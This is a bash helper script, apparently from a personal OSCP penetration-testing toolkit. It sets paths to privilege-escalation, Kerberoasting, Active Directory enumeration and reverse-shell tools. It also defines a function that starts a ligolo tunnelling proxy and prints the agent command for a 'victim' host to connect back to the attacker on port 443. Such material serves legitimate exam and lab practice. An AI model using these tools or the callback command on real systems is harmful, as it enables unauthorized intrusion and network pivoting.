#!/bin/bash

source $HOME/oscp-swiss/script/utils.sh
source $HOME/oscp-swiss/script/alias.sh
load_settings

#############
# Extension #
#############
windows_winpeas_x86="$swiss_utils/Peas/winPEASx86.exe"
windows_winpeas_x64="$swiss_utils/Peas/winPEASx64.exe"
windows_get_spn="$HOME/oscp-swiss/utils/windows/Get-SPN.ps1"
windows_invoke_kerberoast="$swiss_utils/windows/Invoke-Kerberoast.ps1"
windows_runascs="$swiss_utils/windows/RunasCs.ps1"
linux_linpeas="$swiss_utils/Peas/linpeas.sh"
linux_pspy="$swiss_utils/linux/pspy"
rev_shell="$swiss_utils/rev"
windows_sharphound='/usr/share/windows-resources/SharpHoundv2.4.1'

# ref: https://github.com/antonioCoco/ConPtyShell
windows_conpty="$swiss_utils/Invoke-ConPtyShell.ps1"
ligolo_path="$swiss_utils/tunnel/ligolo-0.6.2"


function svc_ligolo() {
    logger info "[i] start ligolo agent"
    logger warn "[i] one-time setup: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up"
    logger info "[i] under victim (find agent executable under \$ligolo_path):"
    logger info "[i] agent.exe -connect $(get_default_network_interface_ip):443 -ignore-cert"
    logger warn "[i] Using fingerprint: "
    logger warn "[i] agent.exe -connect $(get_default_network_interface_ip):443 -accept-fingerprint [selfcert-value]"

    i

    logger info "[i] after connection: "
    logger info "[i] > session                                    # choose the session"
    logger info "[i] > ifconfig                                   # check interface"
    logger info "[i] sudo ip route add 192.168.0.0/24 dev ligolo  # add interface"
    logger info "[i] ip route del 122.252.228.38/32               # removal"

    local ligolo_agent_path="$HOME/oscp-swiss/utils/tunnel/ligolo-0.6.2/proxy"
    $ligolo_agent_path -selfcert -laddr 0.0.0.0:443
}